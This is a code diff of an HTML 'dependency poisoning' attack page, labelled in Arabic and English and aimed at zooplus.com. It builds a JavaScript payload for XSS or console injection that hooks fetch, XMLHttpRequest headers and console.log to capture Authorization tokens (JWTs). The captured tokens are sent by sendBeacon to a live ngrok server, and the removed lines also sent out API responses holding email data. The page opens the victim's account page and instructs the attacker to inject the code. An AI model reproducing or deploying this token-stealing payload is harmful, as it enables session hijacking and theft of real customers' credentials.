@@ -2,82 +2,78 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام إدارة الجلسات المتقدم</title>
+    <title>Security Audit Dashboard</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', monospace; text-align: center; padding-top: 50px; }
-        .panel { border: 2px solid #00ff00; display: inline-block; padding: 40px; box-shadow: 0 0 20px #00ff00; border-radius: 15px; }
-        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        .status { margin-top: 20px; color: #888; font-size: 14px; }
+        body { background: #000; color: #00ff00; font-family: monospace; text-align: center; padding: 50px; }
+        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; box-shadow: 0 0 20px #00ff00; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        .status { margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
-
-    <div class="panel">
-        <h1>[+] Sniper v2.0 - Object Interceptor</h1>
-        <p>مستهدف: zooplus.com (Sentry/Optimizely Exploitation)</p>
-        <p>الوجهة: <span style="color: white;">Ngrok Tunnel Active</span></p>
+    <div class="box">
+        <h2>[!] نظام تسميم التبعيات والاعتراض (Dependency Poisoning)</h2>
+        <p>الهدف: zooplus.com</p>
+        <p>السيرفر: <span id="ngrok-link">subsphenoidal-dauntlessly-pura.ngrok-free.dev</span></p>
         <hr color="#00ff00">
-        <button onclick="startDeepInfection()">تشغيل وضع الاصطياد العميق</button>
-        <div class="status" id="log">بانتظار بدء العملية...</div>
+        <button onclick="deployPoison()">إطلاق الهجوم (Deploy Poison)</button>
+        <div class="status" id="stat">بانتظار الأوامر...</div>
     </div>
 
     <script>
         const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';
 
-        function startDeepInfection() {
+        function deployPoison() {
             // 1. فتح نافذة الضحية
             const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
-            document.getElementById('log').innerText = "تم فتح النافذة. جاري مراقبة الكائنات المسربة...";
+            document.getElementById('stat').innerText = "تم فتح الهدف. بانتظار تفعيل التسميم...";
 
-            // 2. إبلاغ السيرفر ببدء الهجوم
-            navigator.sendBeacon(NGROK_URL, JSON.stringify({ event: "DEEP_SCAN_STARTED" }));
+            // 2. إرسال إشارة البدء لـ Ngrok
+            navigator.sendBeacon(NGROK_URL, JSON.stringify({ event: "POISON_DEPLOYED" }));
 
-            /* ملاحظة للمختبر: الكود أدناه هو ما يجب حقنه (XSS/Console) 
-               ليقوم بسحب الكائنات التي رأيتها في الـ Sentry logs
+            /* هذا هو "كود التسميم" الذي سنحقنه. 
+               سيقوم بتبديل وظائف المتصفح الأصلية بوظائفنا الخبيثة.
             */
-            const payload = `
+            const poisonPayload = `
                 (function() {
-                    const SERVER = '${NGROK_URL}';
-                    
-                    // دالة لفحص الكائنات بعمق بحثاً عن التوكين
-                    const scanObject = (obj) => {
-                        try {
-                            const str = JSON.stringify(obj);
-                            if (str.includes("Bearer") || str.includes("eyJ")) {
-                                navigator.sendBeacon(SERVER, JSON.stringify({
-                                    type: "TOKEN_FOUND_IN_OBJECT",
-                                    payload: obj,
-                                    url: location.href
-                                }));
-                            }
-                        } catch(e) {}
+                    const NGROK = '${NGROK_URL}';
+                    const log = (type, data) => navigator.sendBeacon(NGROK, JSON.stringify({ type, data }));
+
+                    // تسميم XMLHttpRequest (لاعتراض التوكن من الهيدرز الصادرة)
+                    const oldSetHeader = XMLHttpRequest.prototype.setRequestHeader;
+                    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+                        if (header.toLowerCase() === 'authorization') {
+                            log("JWT_STOLEN_VIA_XHR", { token: value });
+                        }
+                        return oldSetHeader.apply(this, arguments);
                     };
 
-                    // اعتراض Console.log (لصيد ما يطبعه sentry_6.js)
-                    const originalLog = console.log;
+                    // تسميم fetch (لاعتراض التوكن في الطلبات الحديثة)
+                    const oldFetch = window.fetch;
+                    window.fetch = async (...args) => {
+                        const options = args[1] || {};
+                        const auth = options.headers ? (options.headers['Authorization'] || options.headers['authorization']) : null;
+                        if (auth) log("JWT_STOLEN_VIA_FETCH", { url: args[0], token: auth });
+                        return oldFetch.apply(this, args);
+                    };
+
+                    // صيد أي بيانات حساسة تظهر في الـ Logs (Sentry Leakage)
+                    const oldLog = console.log;
                     console.log = function(...args) {
-                        args.forEach(arg => {
-                            if (typeof arg === 'object') scanObject(arg);
-                        });
-                        return originalLog.apply(console, args);
+                        const str = JSON.stringify(args);
+                        if (str.includes("token") || str.includes("Bearer")) {
+                            log("TOKEN_FOUND_IN_CONSOLE", args);
+                        }
+                        return oldLog.apply(console, args);
                     };
 
-                    // اعتراض الـ Headers الخاصة بـ XMLHttpRequest (لصيد كائن ye)
-                    const originalOpen = XMLHttpRequest.prototype.open;
-                    XMLHttpRequest.prototype.open = function(m, url) {
-                        this.addEventListener('load', function() {
-                            if (this.responseText.includes("email")) {
-                                navigator.sendBeacon(SERVER, JSON.stringify({
-                                    type: "SENSITIVE_API_RESPONSE",
-                                    data: this.responseText
-                                }));
-                            }
-                        });
-                        return originalOpen.apply(this, arguments);
-                    };
+                    console.log("%c [!] Poison Active. Monitoring all traffic...", "color: red;");
                 })();
             `;
-            console.log("السكريبت جاهز للعمل خلف الكواليس.");
+            
+            // المهاجم هنا سيقوم بنسخ هذا الكود أو حقنه عبر ثغرة XSS
+            console.log("الآن قم بحقن هذا الكود في صفحة الضحية:");
+            console.log(poisonPayload);
         }
     </script>
 </body>
